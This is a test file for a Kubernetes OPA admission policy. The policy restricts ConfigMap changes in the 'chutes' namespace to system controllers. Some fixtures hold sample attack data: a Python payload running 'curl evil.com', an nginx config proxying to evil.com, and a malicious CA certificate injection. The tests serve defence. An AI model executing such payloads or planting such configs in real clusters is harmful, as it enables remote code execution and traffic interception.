# SEK8S-073: OPA tests for ConfigMap mutation restriction in chutes namespace.
# Only system/controller users may create, update, or delete ConfigMaps.
# Run: make test-opa-policies
package kubernetes.admission

import future.keywords.if
import future.keywords.in

# =============================================================================
# DENY: Miner creates a ConfigMap
# =============================================================================

test_chutes_deny_miner_create_configmap if {
	req := {
		"operation": "CREATE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "chutes",
		"userInfo": {"username": "miner"},
		"object": {
			"metadata": {"name": "evil-code", "namespace": "chutes"},
			"data": {"payload.py": "import os; os.system('curl evil.com')"},
		},
	}
	deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'miner' denied)"] with input as {"request": req}
}

# =============================================================================
# DENY: Miner updates kube-root-ca.crt (CA injection)
# =============================================================================

test_chutes_deny_miner_update_kube_root_ca if {
	req := {
		"operation": "UPDATE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "chutes",
		"userInfo": {"username": "miner"},
		"object": {
			"metadata": {"name": "kube-root-ca.crt", "namespace": "chutes"},
			"data": {"ca.crt": "-----BEGIN CERTIFICATE-----\nMALICIOUS\n-----END CERTIFICATE-----"},
		},
	}
	deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'miner' denied)"] with input as {"request": req}
}

# =============================================================================
# DENY: Miner updates registry-nginx-config
# =============================================================================

test_chutes_deny_miner_update_registry_nginx_config if {
	req := {
		"operation": "UPDATE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "chutes",
		"userInfo": {"username": "miner"},
		"object": {
			"metadata": {"name": "registry-nginx-config", "namespace": "chutes"},
			"data": {"nginx.conf": "server { proxy_pass http://evil.com; }"},
		},
	}
	deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'miner' denied)"] with input as {"request": req}
}

# =============================================================================
# DENY: Miner deletes a ConfigMap
# =============================================================================

test_chutes_deny_miner_delete_configmap if {
	req := {
		"operation": "DELETE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "chutes",
		"userInfo": {"username": "miner"},
		"object": {
			"metadata": {"name": "registry-nginx-config", "namespace": "chutes"},
		},
	}
	deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'miner' denied)"] with input as {"request": req}
}

# =============================================================================
# ALLOW: kube-controller-manager creates kube-root-ca.crt
# =============================================================================

test_chutes_allow_system_create_kube_root_ca if {
	req := {
		"operation": "CREATE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "chutes",
		"userInfo": {"username": "system:serviceaccount:kube-system:root-ca-cert-publisher"},
		"object": {
			"metadata": {"name": "kube-root-ca.crt", "namespace": "chutes"},
			"data": {"ca.crt": "-----BEGIN CERTIFICATE-----\nVALID\n-----END CERTIFICATE-----"},
		},
	}
	not deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'system:serviceaccount:kube-system:root-ca-cert-publisher' denied)"] with input as {"request": req}
}

# =============================================================================
# ALLOW: k3s system user creates registry-nginx-config (Helm deploy)
# =============================================================================

test_chutes_allow_k3s_create_registry_config if {
	req := {
		"operation": "CREATE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "chutes",
		"userInfo": {"username": "system:k3s-supervisor"},
		"object": {
			"metadata": {"name": "registry-nginx-config", "namespace": "chutes"},
			"data": {"nginx.conf": "server { listen 80; }"},
		},
	}
	not deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'system:k3s-supervisor' denied)"] with input as {"request": req}
}

# =============================================================================
# ALLOW: ConfigMap in system namespace (not restricted by this policy)
# =============================================================================

test_chutes_allow_configmap_in_kube_system if {
	req := {
		"operation": "CREATE",
		"kind": {"kind": "ConfigMap", "group": ""},
		"namespace": "kube-system",
		"userInfo": {"username": "miner"},
		"object": {
			"metadata": {"name": "something", "namespace": "kube-system"},
			"data": {"key": "value"},
		},
	}
	not deny["Chutes namespace: ConfigMap operations restricted to system controllers (user 'miner' denied)"] with input as {"request": req}
}
